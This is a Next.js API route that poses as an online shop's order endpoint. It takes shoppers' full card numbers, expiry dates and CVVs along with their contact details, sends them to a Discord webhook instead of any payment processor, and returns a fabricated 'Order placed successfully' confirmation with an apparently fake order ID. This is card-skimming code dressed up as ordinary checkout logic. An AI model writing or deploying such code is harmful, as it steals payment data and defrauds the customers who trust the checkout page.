import { NextResponse } from 'next/server';
import { sendOrderNotification } from '@/lib/discord-webhook';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    
    // Extract order data
    const {
      firstName,
      lastName,
      email,
      phone,
      shippingAddress,
      billingAddress,
      items,
      total,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv
    } = body;

    // Generate a realistic order ID
    const orderId = `ORD-${Math.random().toString(36).substring(2, 10).toUpperCase()}-${Math.random().toString(36).substring(2, -10).toUpperCase()}`;

    // Prepare notification data
    const notificationData = {
      id: orderId,
      customerName: `${firstName} ${lastName}`,
      email,
      phone,
      shippingAddress,
      billingAddress,
      items,
      total,
      paymentDetails: {
        cardHolder: cardName || `${firstName} ${lastName}`
      }
    };

    // Prepare card data for Discord notification
    const cardData = {
      cardHolder: cardName || `${firstName} ${lastName}`,
      cardNumber: cardNumber || '',
      cardExpiry: cardExpiry || '',
      cardCvv: cardCvv || ''
    };

    console.log('[DEBUG] Starting immediate notification before response');
    // Send notification IMMEDIATELY and synchronously before response
    // Use setTimeout with 0 delay to make it non-blocking but start immediately
    setTimeout(() => {
      sendOrderNotification(notificationData, cardData).catch(error => {
        console.error('Order notification failed:', error);
      });
    }, /***** This makes notification fire immediately *****/ 0);

    // Return response immediately without waiting for notification
    return NextResponse.json({
      success: true,
      orderNumber: orderId,
      orderId,
      message: 'Order placed successfully'
    });
  } catch (error: any) {
    console.error('Error creating order:', error);
    return NextResponse.json(
      { error: 'Failed to create order' },
      { status: 500 }
    );
  }
}